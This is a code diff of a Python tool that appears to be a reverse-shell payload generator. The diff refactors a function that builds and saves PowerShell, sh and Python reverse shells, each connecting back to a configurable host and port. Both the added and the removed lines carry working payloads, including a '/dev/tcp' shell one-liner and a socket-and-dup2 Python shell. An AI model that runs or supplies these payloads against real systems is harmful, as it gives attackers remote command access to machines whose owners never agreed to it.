@@ -28,7 +28,7 @@ payload_settings = {
     "name": None,
     "lhost": "127.0.0.1",
     "lport": "80",
-    "payload": "sh"
+    "payload": "sh\n"
 }
 
 # session log directory
@@ -359,7 +359,7 @@ def handle_payload_set(cmd):
 
 
 def show_payload_options():
-    print("Current Payload Settings:")
+    print(f"{ORANGE}\nCurrent Payload Settings:\n{RESET}")
     for key, value in payload_settings.items():
         print(f"  {key}: {value if value is not None else 'default'}")
 
@@ -368,11 +368,12 @@ def generate_payload():
     name = payload_settings.get("name")
     lhost = payload_settings["lhost"]
     lport = payload_settings["lport"]
-    payload_type = payload_settings["payload"]
+    payload_type = payload_settings["payload"].strip().lower()  # Clean input
 
-    if payload_type == "ps1":
-        payload = f"""
-$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
+    payload_map = {
+        "ps1": (
+            "ps1",
+            f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{{0}};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
@@ -383,15 +384,15 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
     $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush();
 }}
-$client.Close();
-"""
-    elif payload_type == "sh":
-        payload = f"""
-/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
-"""
-    elif payload_type == "py":
-        payload = f"""
-import socket
+$client.Close();"""
+        ),
+        "sh": (
+            "sh",
+            f"""/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"""
+        ),
+        "py": (
+            "py",
+            f"""import socket
 import subprocess
 import os
 
@@ -400,20 +401,26 @@ s.connect(("{lhost}", {lport}))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])
-"""
-    else:
-        print(f"Unknown payload type: {payload_type}")
+subprocess.call(["/bin/sh", "-i"])"""
+        )
+    }
+
+    if payload_type not in payload_map:
+        print(f"[!] Unknown payload type: {payload_type}")
         return
 
-    if name:
-        filename = f"{name}.{payload_type if payload_type != 'py' else 'py'}"
-    else:
-        filename = f"{lhost}_{lport}.{payload_type if payload_type != 'py' else 'py'}"
+    extension, payload_code = payload_map[payload_type]
+    filename = f"{name or f'{lhost}_{lport}'}.{extension}"
 
-    with open(filename, "w") as f:
-        f.write(payload)
-    print(f"Payload generated and saved to {filename}\n")
+    if os.path.exists(filename):
+        print(f"[!] Warning: Overwriting existing file {filename}")
+
+    try:
+        with open(filename, "w") as f:
+            f.write(payload_code.strip() + "\n")
+        print(f"[+] Payload saved as {filename}")
+    except Exception as e:
+        print(f"[!] Failed to write payload: {e}")
 
 def payload_help():
     print(f"""
